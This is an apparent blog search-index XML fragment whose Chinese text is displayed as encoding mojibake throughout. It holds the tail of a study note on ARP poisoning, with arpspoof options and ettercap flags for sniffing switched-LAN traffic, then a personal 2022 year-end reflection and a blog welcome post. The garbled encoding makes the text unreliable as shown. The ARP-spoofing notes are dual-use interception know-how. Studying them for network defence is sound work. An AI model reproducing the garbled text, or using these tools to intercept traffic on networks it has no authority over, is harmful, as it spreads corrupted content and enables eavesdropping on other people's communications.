‡ä¸»æœºï¼ˆæˆ–æ‰€æœ‰ä¸»æœºï¼‰åˆ°å¦ä¸€ä¸ªä¸»æœºï¼ˆhostï¼‰çš„æ•°æ®åŒ…è½¬å‘è·¯å¾„ã€‚è¿™æ˜¯äº¤æ¢å±€åŸŸç½‘ä¸­å—…æ¢ç½‘ç»œæµé‡çš„ä¸€ç§æä¸ºæœ‰æ•ˆçš„æ–¹æ³•ã€‚</span><br><span class="hljs-code">       å†…æ ¸IPè½¬å‘ï¼ˆæˆ–å¦‚fragrouterè¿™æ ·çš„ã€ç”¨æˆ·å±‚é¢çš„ã€èƒ½å®ŒæˆåŒæ ·åŠŸèƒ½çš„è½¯ä»¶ï¼‰å¿…é¡»æå‰å¼€å¯ã€‚</span><br><span class="hljs-code"></span><br>å‚æ•°<br><span class="hljs-code">       -i interface</span><br><span class="hljs-code">              æŒ‡å®šè¦ä½¿ç”¨çš„æ¥å£ï¼ˆå³æŒ‡å®šä¸€å—ç½‘å¡ï¼‰</span><br><span class="hljs-code"></span><br><span class="hljs-code">       -c own|host|both</span><br><span class="hljs-code">              æŒ‡å®šåœ¨æ¢å¤ARPé…ç½®æ—¶ä½¿ç”¨çš„ç¡¬ä»¶åœ°å€ï¼›å½“åœ¨æ¸…ç†ï¼ˆcleaning upï¼‰æ—¶ï¼Œæ•°æ®åŒ…çš„æºåœ°å€å¯ä»¥ç”¨è‡ªå·±çš„ä¹Ÿå¯ä»¥ç”¨ä¸»æœºï¼ˆhostï¼‰çš„ç¡¬ä»¶åœ°å€ã€‚</span><br><span class="hljs-code">              ä½¿ç”¨ä¼ªé€ çš„ç¡¬ä»¶åœ°å€å¯èƒ½å¯¼è‡´æŸäº›é…ç½®ä¸‹çš„äº¤æ¢ç½‘ç»œã€APç½‘ç»œæˆ–æ¡¥æ¥ç½‘ç»œé€šä¿¡ä¸­æ–­ï¼Œç„¶è€Œå®ƒæ¯”èµ·é»˜è®¤å€¼â€”â€”â€”â€”ä½¿ç”¨è‡ªå·±çš„ç¡¬ä»¶åœ°å€è¦å·¥ä½œåœ°æ›´ä¸ºå¯é ã€‚</span><br><span class="hljs-code"></span><br><span class="hljs-code">       -t target</span><br><span class="hljs-code">              æŒ‡å®šä¸€ä¸ªç‰¹æ®Šçš„ã€å°†è¢«ARPæ¯’åŒ–çš„ä¸»æœºï¼ˆå¦‚æœæ²¡æœ‰æŒ‡å®šï¼Œåˆ™è®¤ä¸ºæ˜¯å±€åŸŸç½‘ä¸­æ‰€æœ‰ä¸»æœºï¼‰ã€‚é‡å¤å¯ä»¥æŒ‡å®šå¤šä¸ªä¸»æœºã€‚</span><br><span class="hljs-code"></span><br><span class="hljs-code">       -r     æ¯’åŒ–ä¸¤ä¸ªä¸»æœºï¼ˆç›®æ ‡å’Œä¸»æœºï¼ˆhostï¼‰ï¼‰ä»¥æ•è·ä¸¤ä¸ªæ–¹å‘çš„ç½‘ç»œæµé‡ã€‚ï¼ˆä»…ä»…åœ¨å’Œ-tå‚æ•°ä¸€èµ·ä½¿ç”¨æ—¶æœ‰æ•ˆï¼‰</span><br><span class="hljs-code"></span><br><span class="hljs-code">       host   hostæ˜¯ä½ æƒ³è¦æˆªè·æ•°æ®åŒ…çš„ä¸»æœº (é€šå¸¸æ˜¯ç½‘å…³)ã€‚</span><br><span class="hljs-code"></span><br></code></pre></td></tr></table></figure><h5 id="ettercap"><a href="#ettercap" class="headerlink" title="ettercap"></a>ettercap</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">i</span>åé¢è·Ÿç€è¿æ¥å±€åŸŸç½‘çš„ç½‘å¡<br>TæŒ‡çš„æ˜¯textæ–‡æœ¬æ¨¡å¼<br><span class="hljs-selector-tag">q</span>ä»¥å®‰é™æ¨¡å¼æ‰§è¡Œè¿™ä¸ªå‘½ä»¤<br>MæŒ‡å®šæ”»å‡»æ¨¡å¼<br>&gt;&gt;è¾“å‡ºæ–‡ä»¶<br></code></pre></td></tr></table></figure><hr><p>å‘ä¸ªç¬”è®°ä¸Šæ¥ä¸ç„¶è¿™ä¸ªåšå®¢çœŸçš„æˆç¢ç¢å¿µä¸“æ äº†ğŸ˜¶â€ğŸŒ«ï¸</p><p>æˆ‘å°±æ˜¯ä¸ªèœé¸¡ğŸƒ</p>]]></content>
    
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>ARP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¹´ç»ˆæ€»ç»“</title>
    <link href="/2022/12/29/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    <url>/2022/12/29/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>æƒ³å¥½æ€æ ·å‘Šåˆ«2022äº†å—ï¼ŸğŸ¥°</p><span id="more"></span><p>æˆ‘æ€»æ˜¯å–œæ¬¢åœ¨å¹´æœ«ç»™æœªæ¥ä¸€å¹´çš„è‡ªå·±ç•™ä¸‹ç¥ç¦ï¼Œä»Šå¹´è¿˜æ˜¯åƒå¾€å¹´ä¸€æ ·çš„å¥—è·¯ï¼šå¸Œæœ›2023çš„è‡ªå·±å¯ä»¥æ›´æ´’è„±ã€æ›´è‡ªç”±ã€‚</p><p>è¿‡å»çš„ä¸€å¹´ï¼Œæˆ‘æ¥åˆ°äº†æ¢¦å¯ä»¥æ±‚çš„åå…«å²ã€‚æˆ‘ä»è¢«å›šç¦åœ¨åº”è¯•æ•™è‚²ä¸­çš„é«˜ä¸­ç”Ÿå˜æˆäº†æ‚ é—²åˆå¿™ç¢Œçš„å¤§å­¦ç”Ÿï¼›æˆ‘è€ƒå‡ºäº†é©¾ç…§ã€å­¦ä¼šäº†å¼¹å‰ä»–ï¼›æˆ‘ç¬¬ä¸€æ¬¡ç¦»å¼€äº†çˆ¶æ¯ã€è¿œç¦»å®¶ä¹¡ï¼Œå¼€å§‹ä½å®¿ç”Ÿæ´»ï¼›æˆ‘äº†è§£åˆ°ä¸åŒçš„ä¸–ç•Œï¼Œçœ‹åˆ°äº†æ–°çš„é£æ™¯ã€‚</p><p>è¿‡å»çš„ä¸€å¹´ï¼Œæˆ‘å’Œå¾ˆå¤šäººç›¸é‡ï¼Œä¹Ÿå’Œå¾ˆå¤šäººå‘Šåˆ«ã€‚</p><p>è¿™å‡ å¤©æˆ‘æƒ³ä¸ºè‡ªå·±æŒ‘é€‰å¹´åº¦ä¹å›¾ï¼Œäºæ˜¯ä¹æˆ‘ç¿»å‡ºäº†ç½‘ç›˜é‡Œå±äºé«˜ä¸­çš„æ–‡ä»¶å¤¹ã€‚æ¯•ç«Ÿå°±åœ¨ä¸ŠåŠå¹´ï¼Œæˆ‘è¿˜æ˜¯ä¸€ä¸ªè¢«è±¢å…»çš„é«˜è€ƒé‡‘ä¸é›€ã€‚æˆ‘æ‰“å¼€çœ‹ï¼Œé‡Œé¢ç››æ»¡äº†æˆ‘é«˜ä¸‰é‚£å¹´ç”¨è€å¤è‘£ç›¸æœºå®šæ ¼çš„é’æ˜¥çƒ­è¡€ã€‚æ–‡ä»¶å¤¹é‡Œæœ‰å­¦æ ¡é‡Œç››å¼€çš„èŠ±ï¼Œé˜³å…‰ä¸‹æƒ¬æ„çš„çŒ«ï¼Œè¿˜æœ‰æ•°ä¸æ¸…çš„æ„æ°”é£å‘çš„å°‘å¹´ã€‚è¿˜è®°å¾—ï¼Œæ™¦æ¶©è€Œåˆç¿çƒ‚çš„é«˜ä¸‰ï¼Œæ¯å¤©æ™šè‡ªä¹ çš„æœ€ååŠå°æ—¶ï¼Œæˆ‘éƒ½æ²¡æœ‰å‘è€å¸ˆå®¶é•¿å®å˜±çš„é‚£èˆ¬æŠ“ç´§æ—¶é—´èƒŒå•è¯ã€å†™å¤§é¢˜ï¼Œæˆ‘æŠŠæ—¶é—´ç”¨æ¥åœ¨æœ¬å­ä¸Šè®°å½•æˆ‘çš„å–œæ€’å“€ä¹ï¼Œä¹¦å†™æˆ‘å¯¹è¿™æ®µæ—¶å…‰çš„ä¸èˆä¸ç•™æ‹ã€‚é«˜ä¸­æ¯•ä¸šï¼Œæˆ‘æ”’äº†ä¸‰æœ¬æ—¥è®°åŠ ä¸€æœ¬éšç¬”ã€‚</p><p>æˆ‘ä»è®°å¾—æ¯•ä¸šé‚£åœºåˆ†åˆ«ï¼Œæˆ‘ä»¬èƒŒç€ä¹¦åŒ…ï¼Œåƒå¹³å¸¸é‚£æ ·è¯´ç€å†è§ã€‚æˆ‘å’Œæœ‹å‹ä»¬æ²¡æœ‰è½°è½°çƒˆçƒˆçš„å‘Šåˆ«ï¼Œåªæœ‰åœ¨è€³è¾¹å¹è¿‡çš„ç‚çƒ­åˆæ½®æ¹¿çš„æ™šé£ï¼Œå’Œçª—å¤–çš„å–§é—¹ä¸æ­¢çš„è‰é¸£ã€‚æˆ‘å°†è®°å½•éšç¬”çš„æœ¬å­å¸¦åˆ°äº†å¤§å­¦ï¼Œå´æœªæ›¾åœ¨ä¸Šé¢å†™ä¸‹ä¸€ä¸ªæ–‡å­—ã€‚æˆ‘åªæ˜¯ä¸€æ¬¡åˆä¸€æ¬¡çš„ç¿»å¼€å®ƒï¼Œå½“ä½œå¤§å­¦ç”Ÿæ´»ä¸­çš„ä¹è¶£ï¼Œå»é‡æ¸©é‚£æ®µå…µè’é©¬ä¹±è€Œåˆæ½‡æ´’è‚†æ„çš„æ—¶å…‰ã€‚å°±åƒæˆ‘åœ¨æœ¬å­é‡Œå†™ä¸‹çš„ç¬¬ä¸€æ®µè¯â€”â€”â€œæˆ‘æ‰€è®°å½•çš„æ¯ä¸€ä¸ªæ–‡å­—ï¼Œéƒ½æ˜¯è¿‡å»çš„æˆ‘å¯¹æœªæ¥çš„èµ ç¤¼â€ã€‚</p><p>å››ä¸ªæœˆçš„å¤§å­¦å¥½åƒç”µå½±èƒ¶å·ï¼Œè¢«æœºå™¨æ‹‰æ‰¯ç€ï¼Œåœ¨æˆ‘çœ¼å‰ä¸€é—ªè€Œè¿‡ï¼Œä½†æ˜¯è¿™æ¡è·¯ä¸Šä»ç„¶æœ‰ç²¾å½©çš„é£æ™¯ã€‚æˆ‘é‡åˆ°äº†æ–°çš„æœ‹å‹ï¼Œå’Œä»–ä»¬åˆ†äº«ä¸åŒçš„å¹¸ç¦ã€‚å…¨æ–°çš„ç”Ÿæ´»å¹¶ä¸æ²¡æœ‰è®©æˆ‘æ„Ÿåˆ°ä¸å®‰ï¼Œæˆ–è®¸æ˜¯éª¨å­é‡Œçš„ç§¯æå‹‡æ•¢ï¼Œå¼‚æˆ–è®¸æ˜¯èº«è¾¹ä¼™ä¼´çš„é¼“åŠ±é™ªä¼´ï¼Œè®©æˆ‘çš„è¿™æ®µæ–°çš„æ—…ç¨‹æ€»æ˜¯å¹³ç¨³ç•…é€šçš„ã€‚ä»å­¦æœŸåˆçš„æ“’æ•Œæ‹³ï¼Œåˆ°å­¦ä¼šçš„æŠ•ç¯®æ¡æ¼æŠ€å·§ï¼Œè¿˜æœ‰ä¸ºäº†äº¤ä½œä¸šå°è¯•çš„æ”¹æºç çš„æ­ªé—¨é‚ªé“ï¼Œå†åˆ°æœŸæœ«ä¸´èµ°å‰å¤œè·å¾—çš„ç¾½æ¯›çƒè€å¸…æŠ€å·§Â·Â·Â·Â·Â·Â·è¿™äº›å¥‡å¥‡æ€ªæ€ªçš„æŠ€èƒ½èƒŒåï¼Œéƒ½æœ‰ä¸€ç¾¤æˆ‘éå¸¸æ„Ÿè°¢ç›¸é‡ç›¸è¯†çš„äººã€‚æˆ‘è¿˜æ˜¯ä¸ªå–œæ¬¢æ”¶é›†ç‰©æ–™çš„äººï¼Œå®¿èˆä¹¦æ¡Œä¸Šçš„è½¯æœ¨æ¿ï¼Œé’‰ç€æˆ‘çš„ç¬¬ä¸€å¼ çŒ®è¡€è¯ä¹¦ï¼Œè´´ç€æˆ‘ç¬¬ä¸€æ¬¡éƒ¨é—¨ç ´å†°ä¼šè®®çš„å¡ç‰‡ï¼Œæ¡†æ¶è¾¹ç¼˜é‡Œå¤¹è¿˜æœ‰ä¸´èµ°æ—¶æ”¶åˆ°çš„æ–°å¹´è´ºå¡Â·Â·Â·Â·Â·Â·è¿™äº›ç‰©ä»¶æ‰¿è½½çš„æ•…äº‹æ€»èƒ½åœ¨å›å¿†é‡Œç† ç† ç”Ÿè¾‰ã€‚</p><p>åœ¨å¤œæ·±æ—¶åˆ†ï¼Œæˆ‘ç»å¸¸ä¼šæŠŠè¿™äº›ç¢ç‰‡ä»è®°å¿†æ·±å¤„æ‹å‡ºæ¥ï¼ŒæŠŠä»–ä»¬æ‹¼å‡‘æˆå®Œæ•´çš„æ‹¼å›¾ã€‚</p><p><del>å¥½å§ï¼Œæˆ‘æ‰¿è®¤è‡ªå·±æ€»æ˜¯æ´»åœ¨å›å¿†é‡Œã€‚</del></p><p>æœ€åï¼Œæ„Ÿè°¢2022ï¼Œè®©æˆ‘é‡åˆ°äº†æ„è¶£ç›¸æŠ•çš„äººï¼Œä¹Ÿè®©æˆ‘æ‹¥æœ‰æ»šçƒ«è€Œåˆçƒ­çƒˆçš„è®°å¿†ã€‚</p><p>æ–°çš„ä¸€å¹´ï¼Œæ„¿æˆ‘æ‰€çˆ±ï¼Œå¹³å®‰é¡ºé‚ã€‚ğŸ†</p>]]></content>
    
    
    <categories>
      
      <category>ç¢ç¢å¿µ</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ä¹å›­å…¥åœºåˆ¸</title>
    <link href="/2022/12/10/%E4%B9%90%E5%9B%AD%E5%85%A5%E5%9C%BA%E5%88%B8/"/>
    <url>/2022/12/10/%E4%B9%90%E5%9B%AD%E5%85%A5%E5%9C%BA%E5%88%B8/</url>
    
    <content type="html"><![CDATA[<p>è¿™æ˜¯ä¸€å¼ ä¹å›­å…¥åœºåˆ¸</p><span id="more"></span><p>æ­å–œä½ å‘ç°äº†å®è—ï¼</p><p>æˆåŠŸæ­å»ºè¿™ä¸ªåšå®¢è¿™æ˜¯æˆ‘ä¸Šå¤§å­¦ä»¥æ¥åšè¿‡æœ€æœ‰æˆå°±æ„Ÿçš„äº‹ã€‚è™½ç„¶è¿‡ç¨‹ä¸­è¸©äº†å¾ˆå¤šå‘ï¼Œä½†æ„Ÿè°¢æˆ‘æ²¡æœ‰æ”¾å¼ƒï¼Œæ‰æœ‰äº†ç°åœ¨è¿™ä¸ªå±äºæˆ‘çš„å°å°æä¹ä¸–ç•Œã€‚</p><p>è¿™é‡Œæ˜¯ä¸€ä¸ªModifierçš„å¤‡å¿˜ä»“åº“ï¼Œä¹Ÿæœ‰å¾ˆå¤šæœªçŸ¥å®è—ã€‚</p><hr><p>æœ€è¿‘åœ¨ä¸åœåœ°ä¿®æ”¹æˆ‘çš„æ–‡ç« ï¼Œå°½å¯èƒ½çš„æŠŠæ–‡ç« å†™å¾—ç®€æ´æ˜äº†ã€‚</p><p>ä¸€äº›å¾ˆåŸºç¡€çš„ä¸œè¥¿ä¹Ÿå‘ä¸Šæ¥ï¼Œä¸€æ˜¯æƒ³è®°å½•è‡ªå·±çš„å­¦ä¹ å†ç¨‹ï¼ŒäºŒæ˜¯æƒ³ç€ï¼Œç­‰åˆ°å“ªå¤©æˆ‘çš„æ–‡ç« ä¹Ÿæœ‰äººçœ‹äº†ï¼Œèƒ½è®©äººä¸€ä¸‹å­å°±èƒ½çœ‹å¾—æ˜ç™½ã€‚</p><hr><p>å¦‚æœä½ çœ‹åˆ°äº†è¿™é‡Œï¼Œé‚£å°±ç¥ä½ åœ¨Modifierçš„æä¹ä¸–ç•Œé‡Œäº«å—è‡ªç”±ä¸å¿«ä¹å§ï¼</p>]]></content>
    
    
    <categories>
      
      <category>ç¢ç¢å¿µ</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
